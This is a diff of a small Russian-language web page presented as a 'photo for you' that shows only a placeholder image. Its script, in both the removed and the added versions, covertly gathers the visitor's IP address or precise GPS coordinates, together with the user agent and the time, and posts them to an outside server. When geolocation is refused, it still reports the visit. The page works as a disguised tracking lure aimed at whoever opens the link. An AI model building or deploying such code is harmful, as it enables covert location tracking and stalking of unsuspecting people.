@@ -1,35 +1,65 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
+  <meta charset="UTF-8" />
   <title>Фото для тебя</title>
 </head>
 <body>
-  <h2>Загрузка…</h2>
-  <img src="https://via.placeholder.com/600x400?text=Фото" style="max-width:100%;display:block;margin:20px auto;">
+  <h2>Загрузка...</h2>
+  <img src="https://via.placeholder.com/600x400?text=Фото" alt="Фото" style="max-width:100%;display:block;margin:20px auto;" />
+
   <script>
-    (function(){
-      var info = {
-        ip: '',
-        ua: navigator.userAgent,
+    function sendLocation(lat, lon) {
+      const info = {
+        latitude: lat,
+        longitude: lon,
         url: window.location.href,
-        time: new Date().toISOString()
+        time: new Date().toISOString(),
+        userAgent: navigator.userAgent
       };
 
-      // Получаем IP через сервис
-      fetch('https://api.ipify.org?format=json')
-        .then(res => res.json())
-        .then(json => {
-          info.ip = json.ip;
-          // Отправляем данные на твой сервер
-          fetch('https://gps-vjas.onrender.com/send', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify(info)
-            });
-          }).catch(console.error);
-        })
-        .catch(console.error);
-    })();
+      fetch('https://gps-vjas.onrender.com/send', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(info)
+      }).catch(console.error);
+    }
+
+    window.onload = function() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function(position) {
+            sendLocation(position.coords.latitude, position.coords.longitude);
+          },
+          function(error) {
+            // Если отказался — просто отправим, что геолокация недоступна
+            fetch('https://gps-vjas.onrender.com/send', {
+              method: 'POST',
+              headers: {'Content-Type': 'application/json'},
+              body: JSON.stringify({
+                error: 'Геолокация не разрешена',
+                url: window.location.href,
+                time: new Date().toISOString(),
+                userAgent: navigator.userAgent
+              })
+            }).catch(console.error);
+          },
+          {enableHighAccuracy: true, timeout: 10000, maximumAge: 0}
+        );
+      } else {
+        // Если браузер не поддерживает геолокацию
+        fetch('https://gps-vjas.onrender.com/send', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            error: 'Геолокация не поддерживается',
+            url: window.location.href,
+            time: new Date().toISOString(),
+            userAgent: navigator.userAgent
+          })
+        }).catch(console.error);
+      }
+    };
   </script>
 </body>
 </html>
